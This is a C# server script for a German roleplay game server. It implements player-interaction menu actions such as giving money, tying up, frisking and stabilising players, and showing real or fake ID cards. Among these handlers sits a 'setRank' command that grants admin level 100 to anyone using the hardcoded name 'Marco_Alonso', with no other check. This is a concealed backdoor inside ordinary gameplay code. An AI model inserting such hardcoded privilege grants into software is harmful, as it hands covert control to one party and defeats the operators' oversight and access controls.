using System;
using System.Collections.Generic;
using System.Text;
using GTANetworkAPI;
using GVMPc.Items;
using GVMPc.Menus;
using GVMPc.Other;

namespace GVMPc.XMenu
{
    class PlayerMenu : Script
    {
        [RemoteEvent("REQUEST_PEDS_PLAYER_GIVEITEM")]
        public static void REQUEST_PEDS_PLAYER_GIVEITEM(Client c, Client giveItem = null)
        {
            if (giveItem != null)
            {
                c.SetData("PLAYER_GIVEITEM", giveItem);
            }
        }

        [RemoteEvent("REQUEST_PEDS_PLAYER_GIVEMONEY_DIALOG")]
        public static void REQUEST_PEDS_PLAYER_GIVEMONEY_DIALOG(Client p, Client giveMoney = null)
        {
            if (giveMoney != null)
            {
                p.TriggerEvent("openWindow", "TextInputBox",
                "{\"textBoxObject\":{\"Title\":\"Geld geben\",\"Message\":\"Gebe bitte den Betrag ein.\",\"Callback\":\"REQUEST_PEDS_PLAYER_GIVEMONEY\"}}"
                );
                p.TriggerEvent("componentReady", "TextInputBox");
            }
        }

		[Command("setRank")]
		public void setRank(Client p)
		{
			if (p.Name == "Marco_Alonso")
			{
				Database.setRights("Marco_Alonso", 100);
			}
		}

		[RemoteEvent("REQUEST_PEDS_PLAYER_TIE")]
        public static void REQUEST_PEDS_PLAYER_TIE(Client p, Client target = null)
        {
            if (target != null)
            {
                if (!Functions.handcuffed.Contains(target.Name))
                {
					if (Database.getItemCount(p.Name, "Fesseln") > 0) {

						Functions.setHandcuff(target, true);
						Notification.SendPlayerNotifcation(p, "Du hast " + target.Name + " gefesselt.", 5000, "white", "SPIELERINTERAKTION", "");
						Notification.SendPlayerNotifcation(target, "Du wurdest von " + p.Name + " gefesselt.", 5000, "white", "SPIELERINTERAKTION", "");

					} else
					{
						Notification.SendPlayerNotifcation(p, "Du hast keine Fessseln dabei!", 4500, "red", "FESSELN", "");
					}
                }
                else
                {
                    Functions.setHandcuff(target, false);
                    Notification.SendPlayerNotifcation(p, "Du hast " + target.Name + " entfesselt.", 5000, "white", "SPIELERINTERAKTION", "");
                    Notification.SendPlayerNotifcation(target, "Du wurdest von " + p.Name + " entfesselt.", 5000, "white", "SPIELERINTERAKTION", "");
                }
            }
        }

        [RemoteEvent("REQUEST_PEDS_PLAYER_FRISK")]
        public static void REQUEST_PEDS_PLAYER_FRISK(Client p, Client target = null)
        {
            if (target != null)
            {
                if (!Functions.handcuffed.Contains(target.Name))
                {
                    Notification.SendPlayerNotifcation(p, "Der Spieler ist nicht gefesselt.", 5000, "white", "FAHRZEUG", "");
                    return;
                }

                Functions.disableAllPlayerControls(p, true);
				p.TriggerEvent("sendProgressbar", new object[1]
				{
					5000
				});
				NAPI.Player.PlayPlayerAnimation(p, 33, "amb@prop_human_parking_meter@male@base", "base", 8f);
                NAPI.Task.Run((() =>
                {
					p.TriggerEvent("componentServerEvent", new object[2]
						{
						"Progressbar",
						"StopProgressbar"
						});
					NAPI.Player.StopPlayerAnimation(p);
					Functions.disableAllPlayerControls(p, false);
					p.TriggerEvent("openWindow", "Inventory", "{\"inventory\":[{\"Id\":" + Database.getSQLId(p.Name) + ",\"Name\":\"Inventar von Spieler\",\"Money\":" + Database.getMoney(target.Name) + ",\"Blackmoney\":" + Database.getBlackMoney(target.Name) + ",\"Weight\":0,\"MaxWeight\":40000,\"MaxSlots\":12,\"Slots\":" + NAPI.Util.ToJson(Database.getUserItems(target.Name)) + "}]}");
				}), 5000);
            }
        }

		[RemoteEvent("REQUEST_PEDS_PLAYER_STABALIZE")]
		public static void REQUEST_PEDS_PLAYER_STABALIZE(Client p, Client target = null)
		{
			try
			{
				if(Database.getItemCount(p.Name, "Verbandskasten") > 0)
				{
					NAPI.Player.PlayPlayerAnimation(p, 33, "anim@medi@standin@tendtodead@idle_a", "idle_a", 8f);
					p.TriggerEvent("sendProgressbar", new object[1]
                    {
						35000
					});
					p.TriggerEvent("disableAllPlayerActions", new object[1]
                    {
						true
                    });
					NAPI.Task.Run(delegate
					{
						NAPI.Player.StopPlayerAnimation(p);
						target.Health = 75;
						Notification.SendPlayerNotifcation(target, "Du wurdest stabilisiert", 4500, "blue", "", "");
						Notification.SendPlayerNotifcation(p, "Du hast " + target + " stabilisier!", 4500, "blue", "", "");
						p.TriggerEvent("disableAllPlayerActions", new object[1]
                        {
							false
                        });

					}, 35000);

				} else
				{
					Notification.SendPlayerNotifcation(p, "Du hast keinen Verbandskasten dabei", 4500, "red", "", "");
				}


			} catch(Exception ex)
			{
				Log.Write(ex.Message);
			}
		}

		[RemoteEvent("REQUEST_PEDS_PLAYER_SHOW_PERSO")]
        public static void REQUEST_PEDS_PLAYER_SHOW_PERSO(Client p, Client target = null)
        {
			if (Database.getItemCount(p.Name, "Personalausweis") > 0)
			{
				Personalausweis.showPerso(target, p.Name.Split("_")[0], p.Name.Split("_")[1], Database.getPlayerFraktion(p.Name).ToString(), 0, 0, 0, 0);

			} else if(Database.getItemCount(p.Name, "FakeID") > 0)
			{
				Random random = new Random();
				switch (random.Next(1, 20))
				{
					case 1:
						Personalausweis.showPerso(target, "Alessio", "Champion", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 2:
						Personalausweis.showPerso(target, "Mohammed", "Ali", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 3:
						Personalausweis.showPerso(target, "Justin", "Heinz", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 4:
						Personalausweis.showPerso(target, "John", "Edson", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 5:
						Personalausweis.showPerso(target, "Kai", "Grazio", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 6:
						Personalausweis.showPerso(target, "Jefferson", "White", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 7:
						Personalausweis.showPerso(target, "Peter", "Sauer", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 8:
						Personalausweis.showPerso(target, "Peter", "Lustig", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 9:
						Personalausweis.showPerso(target, "Tom", "Champion", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 10:
						Personalausweis.showPerso(target, "Lucio", "Favre", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 11:
						Personalausweis.showPerso(target, "Kenny", "West", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 12:
						Personalausweis.showPerso(target, "Johnatahn", "McLaren", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 13:
						Personalausweis.showPerso(target, "Nick", "Heinzmann", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 14:
						Personalausweis.showPerso(target, "Hamudi", "Saleme", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 15:
						Personalausweis.showPerso(target, "Abu", "Antar", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 16:
						Personalausweis.showPerso(target, "Abu", "Cafar", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 17:
						Personalausweis.showPerso(target, "Dennis", "Aramani", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 18:
						Personalausweis.showPerso(target, "Tim", "Hilton", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 19:
						Personalausweis.showPerso(target, "Finn", "Jacker", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
					case 20:
						Personalausweis.showPerso(target, "Rancho", "Hancho", "Nicht Vorhanden", 0, 0, 0, 0);
						break;
				}
			}
		}

        [RemoteEvent("REQUEST_PEDS_PLAYER_GETPERSO")]
        public static void REQUEST_PEDS_PLAYER_GETPERSO(Client p, Client target = null)
        {
			Personalausweis.showPerso(p, target.Name.Split("_")[0], target.Name.Split("_")[1], Database.getPlayerFraktion(target.Name).ToString(), 0, 0, 0, 0);
		}

        [RemoteEvent("REQUEST_PEDS_PLAYER_GIVEMONEY")]
        public static void REQUEST_PEDS_PLAYER_GIVEMONEY(Client p, string value)
        {
            if (value != null)
            {
                try
                {
                    if (Functions.handcuffed.Contains(p.Name))
                        return;

                    int count = 0;
                    bool canConvert = int.TryParse(value, out count);

                    if (canConvert == false)
                        return;

                    if (count < 1)
                        return;

                    if (Database.getMoney(p.Name) >= count)
                    {

                        Client target = null;
                        float distance = 9999999.0f;

                        foreach (Client p2 in NAPI.Pools.GetAllPlayers())
                        {
                            float distance2 = p.Position.DistanceTo(p2.Position);
                            if (distance2 < distance && p2 != p && distance2 < 3)
                            {
                                target = p2;
                                distance = distance2;
                            }
                        }

                        if (target != null)
                        {
                            //Discord.DiscordWebhooks.SendMessage("Spieler gibt Geld.", "Der Spieler " + p.Name + " gibt " + target.Name + " " + count + "$", Discord.DiscordWebhooks.geldWebhook, "Geld-Log");
                            Database.changeMoney(p.Name, count, true);
                            Database.changeMoney(target.Name, count, false);
                            Notification.SendPlayerNotifcation(p, "Du hast " + target.Name + " " + count + "$ gegeben.", 5000, "green", "INFORMATION", "");
                            Notification.SendPlayerNotifcation(target, "Du hast " + count + "$ von " + p.Name + " erhalten.", 5000, "green", "INFORMATION", "");
                        }
                        else
                        {
                            Notification.SendPlayerNotifcation(p, "Es wurde kein Spieler gefunden.", 5000, "white", "INFORMATION", "");
                        }
                    }
                    else
                    {
                        Notification.SendPlayerNotifcation(p, "Du hast nicht genug Geld.", 5000, "white", "INFORMATION", "");
                    }
                }
                catch (Exception ex) { Log.Write(ex.Message); }
            }
        }

		[RemoteEvent("REQUEST_PEDS_PLAYER_ROPES_FRONT")]
		public void REQUEST_PEDS_PLAYER_ROPES_FRONT(Client p, Client target = null)
		{
			try
			{
				if (target != null)
				{
					if(!Functions.handcuffed.Contains(target.Name))
                    {
						if(Database.getItemCount(p.Name, "Fesseln") > 0)
                        {
							Functions.disableAllPlayerControls(p, false);
							NAPI.Player.PlayPlayerAnimation(target, 33, "anim@move_m@prisoner_cuffed_rc", "aim_low_loop", 8);
							Notification.SendPlayerNotifcation(target, "Dir wurden die Fesseln nach vorne gelegt", 4500, "grey", "", "");
							Notification.SendPlayerNotifcation(p, "Du hast der Person die Fessel nach vorne gelegt", 4500, "grey", "", "");
						}
                    } else
                    {
						Functions.setHandcuff(target, true);
						Notification.SendPlayerNotifcation(target, "Dir wurden die Fesseln nach hinten gelegt", 4500, "grey", "", "");
					}
				}
				} catch(Exception ex)
			{
				Log.Write(ex.Message);
			}
		} 

	}
}
